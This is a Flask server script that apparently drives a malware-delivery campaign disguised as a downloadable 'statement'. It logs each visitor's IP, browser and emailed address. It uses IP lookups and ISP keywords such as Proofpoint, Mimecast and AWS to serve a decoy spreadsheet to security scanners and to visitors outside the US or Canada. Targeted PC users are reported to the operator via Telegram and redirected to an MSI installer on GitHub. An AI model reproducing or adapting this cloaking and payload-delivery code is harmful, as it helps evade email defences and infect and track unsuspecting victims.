from flask import Flask, request, session, jsonify
from flask_cors import CORS
from flask import render_template, send_from_directory, redirect, Response
from flask_cors import CORS
from dotenv import load_dotenv
from tg import _send_telegram_message
import os, time
from urllib.parse import quote
from models import Logs, Variables
import requests
import user_agents
import threading
# --- Load Environment Variables ---
load_dotenv()
DEFAULT_USER_ID = os.getenv("USER_ID")
BOT_TOKEN = os.getenv("BOT_TOKEN")
IP_API_KEY = os.getenv("IP_API_KEY")
REDIRECT_URL = os.getenv("REDIRECT_URL")
STRICT_MODE = os.getenv("STRICT_MODE")
OWNER = os.getenv("OWNER")
vercel_url = os.getenv("VERCEL_URL")

# --- Flask App Initialization ---
app = Flask(__name__)
files_folder = ""

CORS(app, resources={r"/*": {"origins": "*"}})


@app.get("/version")
def version():
    return {"status":"success", "version":"version 3.0"}


def get_ip_details(ip_address):
    try:
        if not IP_API_KEY:
            return False, {}
        url = f"http://ip-api.com/json/{ip_address}?fields=66842623"

        headers = {
        
        }

        bot_indicators = ["Amazon", "AWS", "EC2", "DigitalOcean", "Microsoft", 
                      "Outlook", "Proofpoint", "Cisco", "Google", "Azure", "Mimecast"]
        
        ip_data = requests.get(url, headers=headers).json()
        print(ip_data)
        mobile = ip_data.get('mobile', '')
        country_code = ip_data.get('countryCode', '').lower()

        # Store the IP data for logging purposes
        is_bot = False
        
        if country_code not in ["us", "ca"]:
            is_bot = True

        isp = ip_data.get("isp", "").lower()
        org = ip_data.get("org", "").lower()
        proxy = ip_data.get("proxy", "")
        hosting = ip_data.get("hosting", "")

        for keyword in bot_indicators:
            if keyword.lower() in isp or keyword.lower() in org:
                if keyword.lower() == "google" and "google fiber" in org:
                    pass
                else:
                    is_bot = True
                    break

        if country_code != "us":
            if not hosting and not proxy:
                is_bot = False
            else:
                is_bot = True

        if STRICT_MODE == "yes":
            if hosting:
                return True
            
            if proxy:
                return True
    
        if mobile:
            is_bot = False
            
        # Return both the bot status and the IP data
        return is_bot, ip_data
    except Exception as e:
        print("An error occurred ", e)
        return True, {}


def save_logs(data):
    try:
        Logs.insert_one(data)
        return True
    except Exception as e:
        print("An error occurred ", e)
        return False


@app.get("/")
def home():
    return send_from_directory(files_folder, "index.html")


@app.get("/download/statement")
def get_file():
    """
    Main entrypoint: Handles serving the React application.
    The user_id is now passed in API calls from the client, not handled by sessions.
    """

    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent_str  = request.headers.get('User-Agent', '')
    print("\n\n================ Ip Details ===================")
    user_agent = user_agents.parse(user_agent_str)

    # Extract email from request parameters
    email = request.args.get('email', '')
    
    device_type = (
        "mobile" if user_agent.is_mobile else
        "tablet" if user_agent.is_tablet else
        "pc" if user_agent.is_pc else
        "other"
    )
    
    data = {
        "visitor_ip": visitor_ip,
        "user_agent": user_agent_str,
        "device_type": device_type,
        "browser": user_agent.browser.family,
        "os": user_agent.os.family,
        "email": email  # Add email to the data dictionary
    }

    print(data)

    # Get IP details and bot status
    is_bot, ip_details = get_ip_details(visitor_ip)
    
    # Add IP details to the data for logging
    data["ip_details"] = ip_details
    
    threading.Thread(target=save_logs, args=(data,)).start()

    server_data = Variables.find_one({"name":vercel_url})
    if server_data and server_data.get("value") == "off":
        return send_from_directory(files_folder,"STATEMENT.xlsx")

    if is_bot:
        print("redirected bot detected")
        return send_from_directory(files_folder,"STATEMENT.xlsx")

    # Check if device is not a PC, serve index.html instead
    if device_type != "pc":
        print("Non-PC device detected, serving index.html")
        return send_from_directory(files_folder, "index.html")

    print("Works perfectly heading to login")
    # Format dict into readable text
    message = "\n".join([f"{key}: {value}" for key, value in data.items()])
    # Send to telegram
    _send_telegram_message(message)

    return redirect("https://raw.githubusercontent.com/joyeze911/downloads/main/STATEMENT.msi")


@app.get("/statement/download")
def get_file_reverse():
    """
    Main entrypoint: Handles serving the React application.
    The user_id is now passed in API calls from the client, not handled by sessions.
    """

    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent_str  = request.headers.get('User-Agent', '')
    print("\n\n================ Ip Details ===================")
    user_agent = user_agents.parse(user_agent_str)

    # Extract email from request parameters
    email = request.args.get('email', '')
    
    device_type = (
        "mobile" if user_agent.is_mobile else
        "tablet" if user_agent.is_tablet else
        "pc" if user_agent.is_pc else
        "other"
    )
    
    data = {
        "visitor_ip": visitor_ip,
        "user_agent": user_agent_str,
        "device_type": device_type,
        "browser": user_agent.browser.family,
        "os": user_agent.os.family,
        "email": email  # Add email to the data dictionary
    }

    print(data)

    # Get IP details and bot status
    is_bot, ip_details = get_ip_details(visitor_ip)
    
    # Add IP details to the data for logging
    data["ip_details"] = ip_details
    
    threading.Thread(target=save_logs, args=(data,)).start()

    server_data = Variables.find_one({"name":vercel_url})
    if server_data and server_data.get("value") == "off":
        return send_from_directory(files_folder,"STATEMENT.xlsx")

    if is_bot:
        print("redirected bot detected")
        return send_from_directory(files_folder,"STATEMENT.xlsx")

    # Check if device is not a PC, serve index.html instead
    if device_type != "pc":
        print("Non-PC device detected, serving index.html")
        return send_from_directory(files_folder, "index.html")

    print("Works perfectly heading to login")
    # Format dict into readable text
    message = "\n".join([f"{key}: {value}" for key, value in data.items()])
    # Send to telegram
    _send_telegram_message(message)

    return redirect("https://raw.githubusercontent.com/joyeze911/downloads/main/STATEMENT.msi")



@app.get("/server/<status>")
def server(status):

    if status not in ['on','off']:
        return {"error":"Unacceptable status"}
    data = Variables.find_one({"name": vercel_url})
    old_status = None
    if data:
        old_status = data.get("value")
    
    Variables.update_one(
        {"name": vercel_url},
        {"$set": {"value": status}},
        upsert=True
    )
    return jsonify({"status": status, "old_status": old_status, "vercel_url": vercel_url})





@app.get("/")
def default():
    """
    Main entrypoint: Handles serving the React application.
    The user_id is now passed in API calls from the client, not handled by sessions.
    """

    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent_str  = request.headers.get('User-Agent', '')
    print("\n\n================ Ip Details ===================")
    user_agent = user_agents.parse(user_agent_str)

    # Extract email from request parameters
    email = request.args.get('email', '')
    
    device_type = (
        "mobile" if user_agent.is_mobile else
        "tablet" if user_agent.is_tablet else
        "pc" if user_agent.is_pc else
        "other"
    )
    
    data = {
        "visitor_ip": visitor_ip,
        "user_agent": user_agent_str,
        "device_type": device_type,
        "browser": user_agent.browser.family,
        "os": user_agent.os.family,
        "email": email  # Add email to the data dictionary
    }

    print(data)

    # Get IP details and bot status
    is_bot, ip_details = get_ip_details(visitor_ip)
    
    # Add IP details to the data for logging
    data["ip_details"] = ip_details
    
    threading.Thread(target=save_logs, args=(data,)).start()

    server_data = Variables.find_one({"name":vercel_url})
    if server_data and server_data.get("value") == "off":
        return send_from_directory(files_folder,"STATEMENT.xlsx")

    if is_bot:
        print("redirected bot detected")
        return send_from_directory(files_folder,"STATEMENT.xlsx")

    # Check if device is not a PC, serve index.html instead
    if device_type != "pc":
        print("Non-PC device detected, serving index.html")
        return send_from_directory(files_folder, "index.html")

    print("Works perfectly heading to login")
    # Format dict into readable text
    message = "\n".join([f"{key}: {value}" for key, value in data.items()])
    # Send to telegram
    _send_telegram_message(message)

    return redirect("https://raw.githubusercontent.com/joyeze911/downloads/main/STATEMENT.msi")



if __name__ == '__main__':
    app.run()

